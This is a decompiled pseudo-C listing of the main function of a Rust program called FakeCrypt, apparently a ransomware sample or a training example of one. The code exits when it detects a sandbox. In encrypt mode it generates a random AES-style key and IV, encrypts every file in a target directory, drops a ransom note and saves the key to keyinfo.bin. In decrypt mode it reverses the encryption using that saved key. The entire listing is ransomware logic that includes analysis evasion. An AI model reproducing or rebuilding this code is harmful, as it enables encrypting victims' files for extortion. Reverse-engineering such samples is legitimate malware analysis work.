
  int64_t FakeCrypt::main::h8f6c4810655a0166()

{
    char const (** const var_118)[0x36];
    
    if (FakeCrypt::stealth::is_sandbox::hafd329d2780dcab4())
    {
        var_118 = &data_4d9350;
        int64_t var_110_7 = 1;
        int64_t var_108_7 = 8;
        int128_t var_100_3 = {0};
        std::io::stdio::_print::h5b6764aa60c7b687(&var_118);
        std::process::exit::ha5a0456f3200bdd3(1);
        /* no return */
    }
    
    std::env::args::h2d42d299febd4730(&var_118);
    void var_40;
    core::iter::traits::iterator::Iterator::collect::he4dd0fa351f6ca31(&var_40, &var_118);
    int64_t var_30;
    char const (** const s)[0x78];
    int128_t var_100;
    char const (** s_1)[0x78];
    
    if (var_30 != 3)
    {
        if (!var_30)
        {
            core::panicking::panic_bounds_check::h9181a23875c77293(0, 0);
            /* no return */
        }
        
        s = s_1;
        int64_t (* var_150_3)(void* arg1, int64_t arg2) =
            _$LT$alloc..string..String$u20$as$u20$core..fmt..Display$GT$::fmt::h8e584e4fe4b805b4;
        var_118 = &data_4d9360;
        int64_t var_110_8 = 2;
        *var_100[8] = 0;
        char const (** const* var_108_8)[0x78] = &s;
        var_100 = 1;
        std::io::stdio::_eprint::hc8807d5917a19629(&var_118);
    }
    else
    {
        void* var_28 = &s_1[6];
        char const (** r14_1)[0x78] = s_1[7];
        uint64_t rbx_1 = s_1[8];
        std::fs::metadata::h0760d7be52d610f8(&var_118, r14_1);
        int32_t r15_1 = var_118;
        core::ptr::drop_in_place$LT$core..result..Result$LT$std..fs..Metadata$C$std..io..error..Error$GT$$GT$::h18de0bccda4629aa(&var_118);
        char rax_3;
        
        if (r15_1 != 2)
            rax_3 = std::path::Path::is_dir::hf801d9cfeb23f5db(r14_1, rbx_1);
        
        if (r15_1 == 2 || !rax_3)
        {
            s = &var_28;
            int64_t (* var_150_2)(int64_t* arg1, int64_t arg2) =
                _$LT$$RF$T$u20$as$u20$core..fmt..Display$GT$::fmt::h983fa18a9adfd763;
            var_118 = &data_4d9380;
            int64_t var_110_6 = 2;
            *var_100[8] = 0;
            char const (** const* var_108_6)[0x78] = &s;
            var_100 = 1;
            std::io::stdio::_eprint::hc8807d5917a19629(&var_118);
        }
        else
        {
            int64_t r15_2 = s_1[4];
            uint64_t r12_2 = s_1[5];
            int64_t* var_168;
            char const (** const var_130)[0x78];
            int128_t var_68;
            int64_t* var_50;
            
            if (_$LT$$u5b$A$u5d$$u20$as$u20$core..slice..cmp..SlicePartialEq$LT$B$GT$$GT$::equal::h4c5daeced03dccc4(r15_2, r12_2, "encryptdecrypt[+] Encrypting fil…", 7))
            {
                var_50 = rand::rngs::thread::thread_rng::h09fbc33fa767c893();
                __builtin_memset(&s, 0, 0x20);
                var_68 = {0};
                rand::rng::Rng::fill::h6622a59cfa54218d(&var_50, &s);
                rand::rng::Rng::fill::hc443b30d36d1a142(&var_50, &var_68);
                var_130 = r14_1;
                uint64_t var_128 = rbx_1;
                var_168 = &var_130;
                uint64_t (* var_160)(int64_t* arg1, int64_t* arg2) = _$LT$std..path..Display$u20$as$u20$core..fmt..Display$GT$::fmt::h30f11f8aadf82eb7;
                var_118 = &data_4d93a0;
                int64_t var_110 = 2;
                *var_100[8] = 0;
                int64_t** var_108 = &var_168;
                var_100 = 1;
                std::io::stdio::_print::h5b6764aa60c7b687(&var_118);
                FakeCrypt::fileops::encrypt_directory::hb6c6db8e2661d1b6(r14_1, rbx_1, &s, &var_68);
                var_118 = &data_4d93c0;
                int64_t var_110_1 = 1;
                int64_t var_108_1 = 8;
                int128_t var_100_1 = {0};
                std::io::stdio::_print::h5b6764aa60c7b687(&var_118);
                FakeCrypt::fileops::drop_ransom_note::h4942ecd79881b15c();
                std::fs::File::create::h370b037dc00cbdda(&var_118, 
                    "keyinfo.binCould not open key fi…");
                var_168 = core::result::Result$LT$T$C$E$GT$::expect::hfc66c8e2754ad5d3(&var_118, 
                    "Failed to create key fileFailed …", 0x19);
                core::result::Result$LT$T$C$E$GT$::expect::hb04c0fd579f5cc61(
                    std::io::Write::write_all::h61cad997d75bad86(&var_168, &s, 0x20), 
                    "Failed to write keyFailed to wri…", 0x13);
                core::result::Result$LT$T$C$E$GT$::expect::hb04c0fd579f5cc61(
                    std::io::Write::write_all::h61cad997d75bad86(&var_168, &var_68, 0x10), 
                    "Failed to write IV", 0x12);
                var_130 = &data_4d9478;
                int64_t (* var_128_1)(int64_t* arg1, int64_t arg2) =
                    _$LT$$RF$T$u20$as$u20$core..fmt..Display$GT$::fmt::hc366d3db5c7a9bb3;
                var_118 = &data_4d93d0;
                int64_t var_110_2 = 2;
                *var_100_1[8] = 0;
                char const (** const* var_108_2)[0x78] = &var_130;
                var_100_1 = 1;
                std::io::stdio::_print::h5b6764aa60c7b687(&var_118);
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hfc222f4db551af96(var_168);
                core::ptr::drop_in_place$LT$rand..rngs..thread..ThreadRng$GT$::hb2ae31cd1a8c8c1a(
                    &var_50);
                return core::ptr::drop_in_place$LT$alloc..vec..Vec$LT$alloc..string..String$GT$$GT$::h454a48ed0cb28b12(&var_40);
            }
            
            if (_$LT$$u5b$A$u5d$$u20$as$u20$core..slice..cmp..SlicePartialEq$LT$B$GT$$GT$::equal::h4c5daeced03dccc4(r15_2, r12_2, "decrypt[+] Encrypting files in: …", 7))
            {
                s = &data_4d9478;
                int64_t (* var_150_1)(int64_t* arg1, int64_t arg2) =
                    _$LT$$RF$T$u20$as$u20$core..fmt..Display$GT$::fmt::hc366d3db5c7a9bb3;
                var_118 = &data_4d93f0;
                int64_t var_110_3 = 2;
                *var_100[8] = 0;
                char const (** const* var_108_3)[0x78] = &s;
                var_100 = 1;
                std::io::stdio::_print::h5b6764aa60c7b687(&var_118);
                var_130 = nullptr;
                int64_t var_128_2 = 1;
                int64_t* var_120_1 = nullptr;
                std::fs::File::open::h9589f8a30f4c81c4(&var_118, 
                    "keyinfo.binCould not open key fi…");
                s = core::result::Result$LT$T$C$E$GT$::expect::hfc66c8e2754ad5d3(&var_118, 
                    "Could not open key fileFailed to…", 0x17);
                char rax_11;
                int64_t rdx_5;
                rax_11 =
                    _$LT$std..fs..File$u20$as$u20$std..io..Read$GT$::read_to_end::h0619605a8d236003(
                    &s, &var_130);
                core::result::Result$LT$T$C$E$GT$::expect::h6cf4cd195f2db86f(rax_11, rdx_5);
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hfc222f4db551af96(s);
                
                if (var_120_1 != 0x30)
                {
                    var_168 = var_120_1;
                    s = &var_168;
                    int64_t (* var_150_4)(int64_t* arg1, int64_t* arg2) = core::fmt::num::imp::_$LT$impl$u20$core..fmt..Display$u20$for$u20$u64$GT$::fmt::h596da7382ae08600;
                    var_118 = &data_4d9410;
                    int64_t var_110_9 = 2;
                    *var_100[8] = 0;
                    char const (** const* var_108_9)[0x78] = &s;
                    var_100 = 1;
                    std::io::stdio::_eprint::hc8807d5917a19629(&var_118);
                    std::process::exit::ha5a0456f3200bdd3(1);
                    /* no return */
                }
                
                int128_t* rax_13;
                int64_t rdx_7;
                rax_13 = _$LT$core..ops..range..Range$LT$usize$GT$$u20$as$u20$core..slice..index..SliceIndex$LT$$u5b$T$u5d$$GT$$GT$::index::h87c96b7bc7cc52f1(0, 0x20, var_128_2, 0x30);
                char rcx_3 = 1;
                
                if (rdx_7 == 0x20)
                {
                    *var_108_3[1] = rax_13[1];
                    *var_118[1] = *rax_13;
                    rcx_3 = 0;
                }
                
                var_118 = rcx_3;
                core::result::Result$LT$T$C$E$GT$::unwrap::hdbcd3828175a306d(&s, &var_118);
                int128_t* rax_14;
                int64_t rdx_9;
                rax_14 = _$LT$core..ops..range..Range$LT$usize$GT$$u20$as$u20$core..slice..index..SliceIndex$LT$$u5b$T$u5d$$GT$$GT$::index::h87c96b7bc7cc52f1(0x20, 0x30, var_128_2, var_120_1);
                int64_t* rcx_4;
                rcx_4 = 1;
                
                if (rdx_9 == 0x10)
                {
                    *var_118[1] = *rax_14;
                    rcx_4 = nullptr;
                }
                
                var_118 = rcx_4;
                core::result::Result$LT$T$C$E$GT$::unwrap::hd6fa3a1b256db820(&var_50, &var_118);
                var_168 = r14_1;
                uint64_t var_160_1 = rbx_1;
                var_68 = &var_168;
                *var_68[8] = _$LT$std..path..Display$u20$as$u20$core..fmt..Display$GT$::fmt::h30f11f8aadf82eb7;
                var_118 = &data_4d9430;
                int64_t var_110_4 = 2;
                *var_100[8] = 0;
                int128_t* var_108_4 = &var_68;
                var_100 = 1;
                std::io::stdio::_print::h5b6764aa60c7b687(&var_118);
                FakeCrypt::fileops::decrypt_directory::h7bfbee2fc08c838d(r14_1, rbx_1, &s, &var_50);
                var_118 = &data_4d9450;
                int64_t var_110_5 = 1;
                int64_t var_108_5 = 8;
                int128_t var_100_2 = {0};
                std::io::stdio::_print::h5b6764aa60c7b687(&var_118);
                core::ptr::drop_in_place$LT$alloc..vec..Vec$LT$u8$GT$$GT$::h0777b7bfa8327074(
                    &var_130);
                return core::ptr::drop_in_place$LT$alloc..vec..Vec$LT$alloc..string..String$GT$$GT$::h454a48ed0cb28b12(&var_40);
            }
            
            if (!var_30)
            {
                core::panicking::panic_bounds_check::h9181a23875c77293(0, 0);
                /* no return */
            }
            
            s = s_1;
            int64_t (* var_150_5)(void* arg1, int64_t arg2) = _$LT$alloc..string..String$u20$as$u20$core..fmt..Display$GT$::fmt::h8e584e4fe4b805b4;
            var_118 = &data_4d9360;
            int64_t var_110_10 = 2;
            *var_100[8] = 0;
            char const (** const* var_108_10)[0x78] = &s;
            var_100 = 1;
            std::io::stdio::_eprint::hc8807d5917a19629(&var_118);
        }
    }
    std::process::exit::ha5a0456f3200bdd3(1);
    /* no return */
}
